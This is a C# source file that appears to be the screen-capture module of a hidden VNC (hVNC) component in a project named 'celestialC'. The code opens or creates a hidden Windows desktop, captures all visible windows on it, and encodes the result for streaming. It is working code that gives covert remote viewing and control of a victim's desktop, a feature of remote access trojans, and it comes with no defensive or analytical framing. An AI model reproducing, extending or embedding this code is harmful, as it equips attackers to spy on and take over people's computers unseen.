using celestialC.Helper.Services.compression;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static celestialC.Helper.hVNC.Native;

namespace celestialC.Helper.hVNC
{
    class Imaging_handler
    {
        public IntPtr Desktop = IntPtr.Zero;
        public Imaging_handler(string DesktopName)
        {
            IntPtr Desk = OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (Desk == IntPtr.Zero)
            {
                Desk = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            Desktop = Desk;
        }

        private static float GetScalingFactor()
        {
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr desktop = graphics.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(desktop, 10);
                int physicalScreenHeight = GetDeviceCaps(desktop, 117);
                float scalingFactor = (float)physicalScreenHeight / logicalScreenHeight;
                return scalingFactor;
            }
        }

        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            RECT r;
            bool returnValue = false;
            GetWindowRect(hWnd, out r);

            float scalingFactor = GetScalingFactor();
            IntPtr hDcWindow = CreateCompatibleDC(DC);
            IntPtr hBmpWindow = CreateCompatibleBitmap(DC, (int)((r.Right - r.Left) * scalingFactor), (int)((r.Bottom - r.Top) * scalingFactor));

            SelectObject(hDcWindow, hBmpWindow);
            uint nflag = 2;//0, in windows below 8.1 this way not work and needs to be 0
            if (PrintWindow(hWnd, hDcWindow, nflag))
            {
                try
                {
                    Bitmap processImage = Bitmap.FromHbitmap(hBmpWindow);
                    ModifiableScreen.DrawImage(processImage, new Point(r.Left, r.Top));
                    processImage.Dispose();
                    returnValue = true;
                }
                catch
                {

                }
            }
            DeleteObject(hBmpWindow);
            DeleteDC(hDcWindow);
            return returnValue;
        }
        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
        {
            IntPtr currentWindow = GetTopWindow(owner);
            if (currentWindow == IntPtr.Zero)
            {
                return;
            }
            currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDLAST);
            if (currentWindow == IntPtr.Zero)
            {
                return;
            }
            while (currentWindow != IntPtr.Zero)
            {
                DrawHwnd(currentWindow, ModifiableScreen, DC);
                currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDPREV);
            }
        }
        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            if (IsWindowVisible(hWnd))
            {
                DrawApplication(hWnd, ModifiableScreen, DC);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    DrawTopDown(hWnd, ModifiableScreen, DC);
                }
            }
        }
        public void Dispose()
        {
            CloseDesktop(Desktop);
            GC.Collect();
        }
        public byte[] Screenshot(IStreamCodec streamCodec)
        {
            SetThreadDesktop(Desktop);
            IntPtr DC = GetDC(IntPtr.Zero);
            RECT DesktopSize;
            GetWindowRect(GetDesktopWindow(), out DesktopSize);
            float scalingFactor = GetScalingFactor();
            Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
            Graphics ModifiableScreen = Graphics.FromImage(Screen);
            DrawTopDown(IntPtr.Zero, ModifiableScreen, DC);
            ModifiableScreen.Dispose();
            ReleaseDC(IntPtr.Zero, DC);

            var bitmapData = Screen.LockBits(new Rectangle(0, 0, Screen.Width, Screen.Height),
                            ImageLockMode.ReadOnly, Screen.PixelFormat);
            try
            {
                return streamCodec.CodeImage(bitmapData.Scan0, new Rectangle(0, 0, Screen.Width, Screen.Height), Screen.Size,
                       Screen.PixelFormat).ToArray();
            }
            finally
            {
                Screen?.UnlockBits(bitmapData);
            }
        }
    }
}
